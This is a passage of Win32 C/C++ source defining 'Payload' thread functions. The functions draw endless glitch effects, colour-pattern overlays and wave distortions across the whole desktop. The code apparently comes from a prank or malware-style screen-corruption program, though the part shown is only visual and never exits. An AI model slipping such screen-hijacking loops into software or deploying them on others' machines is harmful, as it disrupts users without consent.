        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
            int luckynum = 1 + rand() % 9;
            if (luckynum > 5) {
                rop = SRCERASE;
            }
            else {
                rop = SRCPAINT;
            }
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, rop);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(25);
    }
    return 0;
}

DWORD WINAPI Payload13_num3(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int rop = SRCCOPY; int luckynum = rand() % 5;
        if (luckynum == 2) { rop = SRCAND; }
        else if (luckynum == 4) { rop = SRCPAINT; }
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, rop);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload14_num1(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0;
    BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int randrgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        for (int i = 0; i < w * h; i++) {
            int jntm = i % w ^ i / h;
            rgbScreen[i].rgb += randrgb - ((jntm * xxx) % 1234);
        }
        xxx++;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload15_num1(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / h;
            rgbScreen[i].r = -((i * x) | (i & x) + w * xxx * 4) / 256;
            rgbScreen[i].g = ((i * x) & (i ^ y) + w * xxx * 4) / 256;
            rgbScreen[i].b = -((i * x) ^ (i & x) + w * xxx * 4) / 256;
        }
        xxx++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload16_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                rgbquad[index].rgbRed = (i & x) + i;
                rgbquad[index].rgbGreen = (i | y) + i;
                rgbquad[index].rgbBlue = (i ^ x + y) + i;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(1); i += 2;
    }
    return 0;
}

DWORD WINAPI Payload17_num1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i * w, y = i / h;
            int code = (x ^ y) * i;
            rgbScreen[i].rgb += (-(code >> code) | (code << code)) | ((code << code) | (-(code >> code)));
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI Payload18_num1(LPVOID lpParam) {
    BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * 2; i++) {
            xxx = cos((i / 16)) * 10;
            BitBlt(hcdc, 0, i, w, 1, hcdc, xxx, i, SRCCOPY);
        }
        for (int i = 0; i < h * 2; i++) {
            xxx = cos((i / 16)) * 10;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, xxx, SRCCOPY);
        }

        int color = RGB(rand() % 255, rand() % 255, rand() % 255), y = rand() % h;
        HPEN hPen = CreatePen(PS_SOLID, (rand() % h) / 3, color);
        SelectObject(hcdc, hPen);
        MoveToEx(hcdc, 0, y, NULL);
        LineTo(hcdc, w, y);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);  DeleteObject(hPen);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}